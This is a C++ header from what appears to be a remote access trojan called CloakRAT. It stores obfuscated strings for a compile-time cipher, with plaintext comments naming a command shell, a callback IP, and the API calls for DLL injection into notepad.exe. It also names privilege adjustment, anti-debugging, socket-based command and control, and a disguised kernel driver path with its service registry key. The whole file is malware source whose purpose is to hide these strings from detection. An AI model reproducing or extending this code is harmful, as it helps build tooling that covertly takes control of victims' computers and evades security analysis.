#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i + 9) - 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 11)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 112, 77, 225, 37, 83, 131, 175, 114, 167, 140, 110, 98, 90, 232, 190, 224 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 37, 49, 59, 23, 5, 56, 127, 56, 21, 123 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 19, 99, 100, 68, 5, 109, 41, 109, 27, 101, 38 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 28, 67, 51, 124, 126, 123, 52, 122, 72, 22, 17, 41, 71, 125, 17, 52, 79, 127, 106, 99, 25, 85, 105, 84, 60, 65, 107, 115, 88, 58, 40, 103, 46, 126, 74, 44, 80, 95, 34, 90, 28, 102, 93, 112, 61, 62, 113, 2, 110, 102, 124, 85, 64, 127, 85, 91, 107, 117, 8, 99, 85, 83, 93, 6, 111, 118, 53 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 115, 110, 102, 84, 78, 120, 48, 108, 21, 47, 29, 45 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "C:\ProgramData\Microsoft\Windows\Caches\rvnte58y.sys"
static uint8_t str_kphDriverPathOnDisk_data[] = { 103, 67, 51, 124, 123, 122, 62, 111, 73, 43, 8, 12, 74, 62, 72, 52, 70, 115, 122, 122, 2, 73, 118, 110, 31, 114, 78, 113, 69, 46, 38, 115, 56, 126, 74, 33, 92, 86, 44, 123, 1, 64, 119, 102, 127, 111, 24, 104, 114, 36, 106, 77, 64 };
static EncryptedBytes str_kphDriverPathOnDisk = {
    str_kphDriverPathOnDisk_data,
    sizeof(str_kphDriverPathOnDisk_data)
};

// "\??\C:\ProgramData\Microsoft\Windows\Caches\rvnte58y.sys"
static uint8_t str_kphDriverNtPath_data[] = { 21, 92, 54, 31, 119, 75, 107, 84, 107, 56, 10, 47, 89, 43, 68, 44, 106, 110, 120, 84, 32, 83, 122, 122, 4, 93, 118, 126, 95, 22, 30, 109, 37, 70, 102, 55, 76, 98, 10, 105, 62, 90, 100, 123, 87, 120, 91, 62, 127, 111, 44, 12, 74, 52, 122, 97, 116 };
static EncryptedBytes str_kphDriverNtPath = {
    str_kphDriverNtPath_data,
    sizeof(str_kphDriverNtPath_data)
};

// "SYSTEM\CurrentControlSet\Services\rvnte58y"
static uint8_t str_servicesPath_data[] = { 59, 83, 80, 115, 127, 77, 28, 84, 120, 63, 23, 58, 78, 36, 93, 43, 100, 116, 109, 122, 2, 86, 74, 109, 31, 114, 74, 125, 89, 60, 32, 103, 46, 81, 85, 50, 73, 80, 61, 109, 104, 10, 120 };
static EncryptedBytes str_servicesPath = {
    str_servicesPath_data,
    sizeof(str_servicesPath_data)
};

// "ImagePath"
static uint8_t str_ImagePath_data[] = { 71, 73, 100, 65, 76, 109, 1, 105, 79, 34 };
static EncryptedBytes str_ImagePath = {
    str_ImagePath_data,
    sizeof(str_ImagePath_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 48, 78, 125, 115, 78, 124, 24, 102, 93, 37, 23, 37, 74, 62, 64, 7, 101, 78, 113, 122, 8, 91, 125 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 71, 71, 108, 84, 104, 125, 35, 122, 94, 36, 17, 28, 67, 56, 76, 9, 111 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 93, 83, 101, 69, 78, 120 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 51, 79, 121, 69, 69, 88, 35, 103, 88, 47, 22, 59 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 36, 86, 96, 82, 95, 125, 48, 100, 122, 38, 9, 39, 72, 15, 81 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 13, 87, 123, 73, 95, 109, 1, 122, 84, 41, 0, 59, 88, 7, 76, 5, 100, 104, 96 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 62, 76, 102, 65, 79, 68, 56, 106, 73, 43, 23, 49, 106 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 79, 67, 123, 69, 74, 124, 52, 90, 94, 39, 10, 60, 78, 30, 65, 26, 110, 123, 125 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 85, 67, 101, 79, 88, 109, 25, 105, 85, 46, 9, 45 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 125, 76, 102, 79, 64, 125, 33, 88, 73, 35, 19, 33, 71, 47, 78, 13, 93, 123, 117, 125, 8, 123 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 29, 71, 108, 84, 103, 105, 34, 124, 126, 56, 23, 39, 89 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 118, 65, 109, 74, 94, 123, 37, 92, 84, 33, 0, 38, 123, 56, 64, 30, 98, 118, 124, 111, 8, 73 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 16, 79, 121, 69, 69, 88, 35, 103, 88, 47, 22, 59, 127, 37, 66, 13, 101 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 30, 71, 108, 84, 104, 125, 35, 122, 94, 36, 17, 24, 89, 37, 74, 13, 120, 105 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 21, 67, 123, 69, 74, 124, 52, 92, 84, 37, 9, 32, 78, 38, 89, 91, 57, 73, 119, 105, 29, 73, 113, 103, 31 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 8, 80, 123, 79, 72, 109, 34, 123, 8, 120, 35, 33, 89, 57, 93 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 49, 80, 123, 79, 72, 109, 34, 123, 8, 120, 43, 45, 83, 62 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 78, 67, 123, 69, 74, 124, 52, 88, 82, 58, 0 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 54, 83, 108, 84, 99, 105, 63, 108, 87, 47, 44, 38, 77, 37, 91, 5, 106, 110, 112, 103, 3 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 87, 82, 108, 65, 79, 78, 56, 100, 94 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 58, 70, 102, 82, 70, 105, 37, 69, 94, 57, 22, 41, 76, 47, 104 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 40, 76, 102, 67, 74, 100, 23, 122, 94, 47 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 37, 67, 123, 69, 74, 124, 52, 88, 73, 37, 6, 45, 88, 57, 104 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 115, 73, 122, 100, 78, 106, 36, 111, 92, 47, 23, 24, 89, 47, 90, 13, 101, 110 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 43, 71, 108, 84, 102, 103, 53, 125, 87, 47, 45, 41, 69, 46, 69, 13, 92 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 5, 86, 96, 82, 95, 125, 48, 100, 107, 56, 10, 60, 78, 41, 93 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 24, 72, 108, 65, 91, 91, 52, 124, 114, 36, 3, 39, 89, 39, 72, 28, 98, 117, 119 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 67, 70, 96, 78, 79, 95, 56, 102, 95, 37, 18, 31 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 10, 71, 108, 84, 123, 122, 62, 107, 94, 57, 22, 0, 78, 43, 89 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 46, 71, 108, 84, 104, 103, 60, 120, 78, 62, 0, 58, 101, 43, 68, 13, 92 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 37, 79, 121, 69, 69, 92, 57, 122, 94, 43, 1 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 22, 71, 108, 84, 110, 102, 39, 97, 73, 37, 11, 37, 78, 36, 93, 62, 106, 104, 112, 105, 15, 86, 124, 95 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 46, 71, 108, 84, 127, 96, 35, 109, 90, 46, 38, 39, 69, 62, 76, 16, 127 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 86, 73, 122, 119, 68, 127, 103, 60, 107, 56, 10, 43, 78, 57, 90 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 69, 71, 108, 84, 124, 97, 63, 108, 84, 61, 41, 39, 69, 45, 121, 28, 121, 77 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 109, 71, 108, 84, 124, 97, 63, 108, 84, 61, 55, 45, 72, 62 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 66, 87, 90, 97, 120, 124, 48, 122, 79, 63, 21 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 103, 104, 125, 79, 69, 123 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 80, 105, 103, 69, 95, 87, 33, 124, 84, 36 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 86, 99, 102, 78, 69, 109, 50, 124 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 14, 104, 125, 79, 69, 100 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 57, 115, 108, 78, 79 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 22, 115, 102, 67, 64, 109, 37 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 63, 114, 108, 67, 93 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 11, 110, 125, 79, 67, 100 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 52, 99, 101, 79, 88, 109, 34, 103, 88, 33, 0, 60 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 81, 87, 90, 97, 104, 100, 52, 105, 85, 63, 21 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 17, 107, 108, 82, 69, 109, 61, 59, 9, 100, 1, 36, 71 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 120, 110, 125, 68, 71, 100, 127, 108, 87, 38 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 43, 97, 109, 86, 74, 120, 56, 59, 9, 100, 1, 36, 71 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 49, 119, 122, 18, 116, 59, 99, 38, 95, 38, 9 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 85, 117, 122, 69, 89, 59, 99, 38, 95, 38, 9 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 79, 87, 90, 97, 108, 109, 37, 68, 90, 57, 17, 13, 89, 56, 70, 26 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

